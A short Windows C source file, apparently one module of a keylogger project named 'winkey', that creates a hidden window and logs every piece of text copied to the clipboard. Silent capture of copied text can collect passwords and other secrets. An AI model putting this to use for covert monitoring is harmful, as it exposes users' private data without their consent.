#include "winkey.h"


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (msg == WM_CLIPBOARDUPDATE)
    {
        if (IsClipboardFormatAvailable(CF_UNICODETEXT))
        {
            OpenClipboard(hwnd);
            HGLOBAL hDatas = GetClipboardData(CF_UNICODETEXT);
            LPSTR datas = GlobalLock(hDatas);
            if (datas != NULL)
                log(datas, CLPB_MODE, TRUE);
            GlobalUnlock(hDatas);
            CloseClipboard();
        }
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

WNDCLASSEXA CreateEmptyClassWindow(void)
{
    WNDCLASSEXA wcx;

    ZeroMemory(&wcx, sizeof(wcx));//memset(dst, 0, szof dst)
    wcx.cbSize = sizeof(WNDCLASSEXA);
    wcx.lpfnWndProc = WndProc;
    wcx.hInstance = GetModuleHandle(NULL);
    wcx.lpszClassName = "clpbdDataClass";
    return wcx;
}

/// @brief Cree une fenetre vide afin de recevoir les donnees du clipboard.
/// @param  
/// @return 
HWND CreateEmptyWindow(void)
{
    HWND hwnd;

    hwnd = CreateWindowExA(0, "clpbdDataClass", NULL, WS_DISABLED, 0, 0, 0, 0, (HWND)NULL, (HMENU)NULL, GetModuleHandle(NULL), NULL);
    if (hwnd == NULL)
        return NULL;
    return hwnd;
}